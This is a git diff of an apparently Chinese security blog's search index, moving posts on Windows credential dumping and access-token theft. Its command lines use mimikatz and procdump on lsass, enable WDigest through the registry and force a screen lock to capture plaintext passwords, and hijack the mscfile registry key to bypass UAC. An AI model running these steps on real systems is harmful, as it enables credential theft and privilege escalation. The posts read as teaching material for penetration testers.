+<p>  LM Hash的全名为”LAN Manager Hash”，是微软为了提高Windows操作系统的安全性而采用的散列值加密算法，其本质是DES加密。尽管LM Hash比较容易破解，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了（从 Windows Vista 和 Windows 2008 版本开始禁用）。如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash值通常是”aad3b435b51404eeaad3b435b51404ee”(表示LM Hash值为空或者被禁用)。</p>
+<p>  NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。NTLM Hash是基于MD4加密算法进行加密的。个人版从Windows Vista 以后，服务器版从Windows Server 2003以后，Windows操作系统的认证方式均为NTLM Hash。</p>
+</blockquote>
+<h2 id="0x02-散列值获取方法"><a href="#0x02-散列值获取方法" class="headerlink" title="0x02 散列值获取方法"></a>0x02 散列值获取方法</h2><p>要想在Windows操作系统中抓取散列值或明文密码，必须将权限升级至System。本地用户名，散列值和其它安全验证信息都保存在SAM文件中。lsass.exe进程(它用于本地安全和登陆策略)用于实现Windows的安全策略，可以使用工具将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。</p>
+<p>利用前提：拿到了管理员权限的cmd，管理员用密码登录过机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。</p>
+<p>在<strong>KB2871997</strong>之前， 使用 Mimikatz 可以直接抓取明文密码。</p>
+<p>当服务器安装 <strong>KB2871997</strong> 补丁后，系统默认禁用 Wdigest Auth（<strong>Windows 2012及以上版本</strong>） ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>    但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）之后通过手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 &#x3D; 截取明文密码</p>
+<h3 id="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"><a href="#使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）" class="headerlink" title="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"></a>使用mimikatz在线读取SAM文件（目标没有杀软，或者<code>mimikatz</code>已免杀）</h3><p>直接将<code>mimikatz</code>上传至目标机器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;    #在线读取散列值及铭文密码</span><br></pre></td></tr></table></figure>
+
+<p>该操作需要管理员权限，否则报错，无法读取密码，报错信息如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221939.png" alt="image-20210207221937863"></p>
+<p>管理员权限执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221945.png" alt="image-20210207221846491"></p>
+<h4 id="使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）"><a href="#使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）"></a>使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）</h4><p>（1）导出<code>lsass.dmp</code>文件</p>
+<p>通过 <code>procdump.exe</code> 文件导出<code>lsass.dmp</code>文件（Procdump是微软官方发布的工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截）</p>
+<p><code>procdump</code>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
+<p><strong>管理员权限运行</strong>该命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207215155.png" alt="image-20210207214123607"></p>
+<p>(2）使用mimikatz导出lsass.dmp文件中的密码散列值</p>
+<p>将目标机器上的 <code>lsass.tmp</code> 拉取到本地，与<code>mimikatz</code>同目录，使用<code>mimikatz</code>解密目标系统密码。（本地机器需与目标机器的版本位数一致）</p>
+<p>运行mimikatz.exe 解密该文件。注：32位就用32位的<code>mimikatz</code>破解，同理64位的也是。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207213854.png" alt="image-20210207213852318"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207214737.png" alt="image-20210207214733408"></p>
+<h4 id="mimikatz无法读取到密码时"><a href="#mimikatz无法读取到密码时" class="headerlink" title="mimikatz无法读取到密码时"></a>mimikatz无法读取到密码时</h4><p>在默认情况下，当系统为<strong>Windows 2012R2</strong>以上或者安装 <strong>KB2871997</strong> 补丁时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p>
+<p><strong>开启Wdigest Auth</strong></p>
+<ul>
+<li><p>cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>meterpreter</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>关闭Wdigest Auth</strong></p>
+<p>关闭命令如下：</p>
+<ul>
+<li><p>cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>meterpreter</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>强制锁屏</strong></p>
+<p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p>
+<p>强制锁屏，让管理员重新登录。</p>
+<ul>
+<li><p>cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
+
+<p>等待管理员重新登录，之后重新读取，可读到明文密码。</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1058,90 +1142,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows系统散列值获取</title>
-    <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
-    <content><![CDATA[<blockquote>
-<p>  明年今日，人生一大喜事(≧∇≦)ﾉ  弱弱问一句我很胖吗？183 165</p>
-</blockquote>
-<h1 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h1><h2 id="0x01-LM-Hash与NTLM-Hash"><a href="#0x01-LM-Hash与NTLM-Hash" class="headerlink" title="0x01 LM Hash与NTLM Hash"></a>0x01 LM Hash与NTLM Hash</h2><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在<code>ntds.dit</code>中，加密后为散列值。</p>
-<p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash。在Windows操作系统中，Hash的结构通常如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:RID:LM-HASH:NT-HASH</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>  LM Hash的全名为”LAN Manager Hash”，是微软为了提高Windows操作系统的安全性而采用的散列值加密算法，其本质是DES加密。尽管LM Hash比较容易破解，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了（从 Windows Vista 和 Windows 2008 版本开始禁用）。如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash值通常是”aad3b435b51404eeaad3b435b51404ee”(表示LM Hash值为空或者被禁用)。</p>
-<p>  NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。NTLM Hash是基于MD4加密算法进行加密的。个人版从Windows Vista 以后，服务器版从Windows Server 2003以后，Windows操作系统的认证方式均为NTLM Hash。</p>
-</blockquote>
-<h2 id="0x02-散列值获取方法"><a href="#0x02-散列值获取方法" class="headerlink" title="0x02 散列值获取方法"></a>0x02 散列值获取方法</h2><p>要想在Windows操作系统中抓取散列值或明文密码，必须将权限升级至System。本地用户名，散列值和其它安全验证信息都保存在SAM文件中。lsass.exe进程(它用于本地安全和登陆策略)用于实现Windows的安全策略，可以使用工具将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。</p>
-<p>利用前提：拿到了管理员权限的cmd，管理员用密码登录过机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。</p>
-<p>在<strong>KB2871997</strong>之前， 使用 Mimikatz 可以直接抓取明文密码。</p>
-<p>当服务器安装 <strong>KB2871997</strong> 补丁后，系统默认禁用 Wdigest Auth（<strong>Windows 2012及以上版本</strong>） ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>    但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）之后通过手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 &#x3D; 截取明文密码</p>
-<h3 id="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"><a href="#使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）" class="headerlink" title="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"></a>使用mimikatz在线读取SAM文件（目标没有杀软，或者<code>mimikatz</code>已免杀）</h3><p>直接将<code>mimikatz</code>上传至目标机器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;    #在线读取散列值及铭文密码</span><br></pre></td></tr></table></figure>
-
-<p>该操作需要管理员权限，否则报错，无法读取密码，报错信息如下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221939.png" alt="image-20210207221937863"></p>
-<p>管理员权限执行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221945.png" alt="image-20210207221846491"></p>
-<h4 id="使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）"><a href="#使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）"></a>使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）</h4><p>（1）导出<code>lsass.dmp</code>文件</p>
-<p>通过 <code>procdump.exe</code> 文件导出<code>lsass.dmp</code>文件（Procdump是微软官方发布的工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截）</p>
-<p><code>procdump</code>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
-<p><strong>管理员权限运行</strong>该命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207215155.png" alt="image-20210207214123607"></p>
-<p>(2）使用mimikatz导出lsass.dmp文件中的密码散列值</p>
-<p>将目标机器上的 <code>lsass.tmp</code> 拉取到本地，与<code>mimikatz</code>同目录，使用<code>mimikatz</code>解密目标系统密码。（本地机器需与目标机器的版本位数一致）</p>
-<p>运行mimikatz.exe 解密该文件。注：32位就用32位的<code>mimikatz</code>破解，同理64位的也是。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207213854.png" alt="image-20210207213852318"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207214737.png" alt="image-20210207214733408"></p>
-<h4 id="mimikatz无法读取到密码时"><a href="#mimikatz无法读取到密码时" class="headerlink" title="mimikatz无法读取到密码时"></a>mimikatz无法读取到密码时</h4><p>在默认情况下，当系统为<strong>Windows 2012R2</strong>以上或者安装 <strong>KB2871997</strong> 补丁时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p>
-<p><strong>开启Wdigest Auth</strong></p>
-<ul>
-<li><p>cmd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>powershell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>meterpreter</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p><strong>关闭Wdigest Auth</strong></p>
-<p>关闭命令如下：</p>
-<ul>
-<li><p>cmd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>powershell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>meterpreter</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p><strong>强制锁屏</strong></p>
-<p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p>
-<p>强制锁屏，让管理员重新登录。</p>
-<ul>
-<li><p>cmd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
-
-<p>等待管理员重新登录，之后重新读取，可读到明文密码。</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>gitHub_cve_monitor</title>
     <url>/2021/02/25/github_cve_monitor/</url>
     <content><![CDATA[<blockquote>
@@ -1281,86 +1281,6 @@
       </tags>
   </entry>
   <entry>
-    <title>令牌窃取分析及防范</title>
-    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
-    <content><![CDATA[<blockquote>
-<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
-</blockquote>
-<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
-<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
-<ul>
-<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
-<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
-<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
-</ul>
-<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
-<p>目前访问令牌分为两种令牌：</p>
-<ul>
-<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
-<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
-</ul>
-<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
-<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
-<ul>
-<li>用户帐户的安全标识符(SID)</li>
-<li>用户帐户所属的用户群的SIDs</li>
-<li>一个logon SID，标识当前登录会话</li>
-<li>用户或用户群的特权清单</li>
-<li>所有者的SID</li>
-<li>基本群的SID</li>
-<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
-<li>访问令牌资源</li>
-<li>是否为primary或impersonation token</li>
-<li>限制性SIDs的可选列表</li>
-<li>当前impersonation级别</li>
-<li>其他统计</li>
-</ul>
-<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
-<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
-<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
-<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
-<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
-<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
-<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
-<blockquote>
-<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
-<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
-</blockquote>
-<p>得到授权令牌：		</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
-
-<p>得到模拟令牌：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
-
-<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
-<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
-<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
-<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
-<ul>
-<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
-<li>及时安装微软推送的补丁</li>
-<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
-<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
-<li>对于令牌，应采取加密存储及多长验证保护</li>
-<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
-</ul>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqlmap关于os-shell小记</title>
     <url>/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol>
@@ -1449,6 +1369,86 @@
       <tags>
         <tag>sqlmap使用</tag>
         <tag>getshell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>令牌窃取分析及防范</title>
+    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
+    <content><![CDATA[<blockquote>
+<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
+</blockquote>
+<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
+<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
+<ul>
+<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
+<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
+<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
+</ul>
+<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
+<p>目前访问令牌分为两种令牌：</p>
+<ul>
+<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
+<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
+</ul>
+<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
+<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
+<ul>
+<li>用户帐户的安全标识符(SID)</li>
+<li>用户帐户所属的用户群的SIDs</li>
+<li>一个logon SID，标识当前登录会话</li>
+<li>用户或用户群的特权清单</li>
+<li>所有者的SID</li>
+<li>基本群的SID</li>
+<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
+<li>访问令牌资源</li>
+<li>是否为primary或impersonation token</li>
+<li>限制性SIDs的可选列表</li>
+<li>当前impersonation级别</li>
+<li>其他统计</li>
+</ul>
+<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
+<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
+<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
+<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
+<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
+<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
+<blockquote>
+<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
+<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
+</blockquote>
+<p>得到授权令牌：		</p>
